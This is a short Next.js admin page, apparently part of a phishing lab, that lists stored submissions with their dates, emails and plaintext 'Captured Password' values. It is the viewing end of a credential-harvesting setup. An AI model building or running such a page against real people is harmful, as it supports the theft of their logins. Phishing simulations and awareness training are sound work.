import { PrismaClient, LabSubmission } from "@prisma/client";

const prisma = new PrismaClient();
export const dynamic = "force-dynamic";

export default async function AdminPage() {
  // TypeScript will now know exactly what 'submissions' is
  const submissions: LabSubmission[] = await prisma.labSubmission.findMany({
    orderBy: {
      createdAt: "desc",
    },
  });

  return (
    <div className="min-h-screen bg-gray-900 p-8 font-mono text-gray-100">
      <div className="mx-auto max-w-7xl">
        <h1 className="text-3xl font-bold text-white mb-8">
          Admin <span className="text-red-500">Log</span>
        </h1>

        <div className="overflow-hidden rounded-xl border border-gray-800 bg-gray-800/50">
          <table className="w-full text-left">
            <thead className="bg-gray-800 text-xs uppercase text-gray-400">
              <tr>
                <th className="px-6 py-4">Date</th>
                <th className="px-6 py-4">Email</th>
                <th className="px-6 py-4">Captured Password</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800">
              {/* Type the item as LabSubmission to satisfy ESLint */}
              {submissions.map((item: LabSubmission) => (
                <tr key={item.id} className="hover:bg-gray-700/30">
                  <td className="px-6 py-4 text-sm text-gray-500">
                    {new Date(item.createdAt).toLocaleDateString()}
                  </td>
                  <td className="px-6 py-4 text-blue-400">{item.email}</td>
                  <td className="px-6 py-4">
                    <span className="rounded bg-red-900/30 px-2 py-1 text-red-500">
                      {item.password}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}